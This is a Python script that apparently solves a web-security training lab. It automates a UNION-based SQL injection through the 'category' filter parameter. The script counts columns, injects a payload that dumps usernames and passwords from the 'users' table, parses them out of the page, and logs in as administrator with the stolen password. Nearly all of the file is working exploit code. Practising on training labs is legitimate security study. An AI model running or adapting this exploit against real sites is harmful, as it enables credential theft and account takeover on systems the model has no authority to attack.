from lib import (
    SESSION,
    login_as_administrator,
    generate_parser,
    find_no_of_columns,
    find_columns_of_type_string,
    check_is_lab_solved,
)
from lxml import html

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    columns = find_no_of_columns(f"{lab_url}/filter?category=")

    target_columns = find_columns_of_type_string(
        lab_url_with_end_point=f"{lab_url}/filter?category=",
        no_of_columns=columns,
    )

    print("[+] Fetching the `username` and `password` columns from `users` table")

    payload = ", ".join(
        [
            "username || ':' || password" if j in target_columns else "NULL"
            for j in range(columns)
        ]
    )

    query = f"' UNION SELECT {payload} FROM users--"

    print(f"[+] Making query: {lab_url}/filter?category={query}")

    response = SESSION.get(f"{lab_url}/filter?category={query}")

    if response.status_code == 200:
        tree = html.fromstring(response.text)

        rows = tree.xpath("//table/tbody/tr/th/text()")

        print("[+] Credentials found in the `users` table:")

        users_dict = dict()

        print()
        for row in rows:
            [username, password] = row.strip().split(":")
            users_dict[username] = password
            print(f"{username}:{password}")
        print()

        if users_dict.get("administrator"):
            administrator_password = users_dict.get("administrator")

            if administrator_password:
                login_as_administrator(lab_url, administrator_password)
            else:
                print("[-] administrator credential not found in the dict")
                exit()

        else:
            print("[-] administrator credential not found")
            exit()

    else:
        print("[-] Failed to fetch the usernames and passwords")
        exit()

    check_is_lab_solved(lab_url)
